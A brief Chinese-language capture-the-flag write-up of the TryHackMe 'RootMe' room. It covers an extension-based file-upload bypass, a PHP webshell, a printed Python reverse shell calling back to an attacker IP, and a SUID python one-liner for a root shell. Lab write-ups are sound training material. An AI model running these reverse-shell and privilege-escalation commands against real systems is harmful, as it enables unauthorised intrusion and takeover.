---
title: '[thm] RootMe'
date: 2024-12-27 20:09 +0800
categories: [hack,TryHackMe]
tags: []
---

## information

![alt text](<../assets/img/2024-12-27-[thm] rootme.assets/image.png>)
> 端口扫描

![alt text](<../assets/img/2024-12-27-[thm] rootme.assets/image-2.png>)

![alt text](<../assets/img/2024-12-27-[thm] rootme.assets/image-1.png>)
> panel

![alt text](<../assets/img/2024-12-27-[thm] rootme.assets/image-3.png>)

![alt text](<../assets/img/2024-12-27-[thm] rootme.assets/image-4.png>)
改个后缀就可以成功上传了，但是反弹shell居然用不了，可能是php版本问题，换个一句话🐎上去。

![alt text](<../assets/img/2024-12-27-[thm] rootme.assets/image-5.png>)

## user1

![alt text](<../assets/img/2024-12-27-[thm] rootme.assets/image-6.png>)
> python3%20-c%20'import%20os,pty,socket;s=socket.socket();s.connect(("10.14.95.76",1234));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn("sh")'

换了python3的反弹shell拿下用户

## root

![alt text](<../assets/img/2024-12-27-[thm] rootme.assets/image-8.png>)
> ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
![alt text](<../assets/img/2024-12-27-[thm] rootme.assets/image-7.png>)
有蟒蛇啊有蟒蛇！

## conclution
- 看了upload的代码，预期是用php5之类的后缀绕过，所以phtml用不了
- 不必局限于一种方式。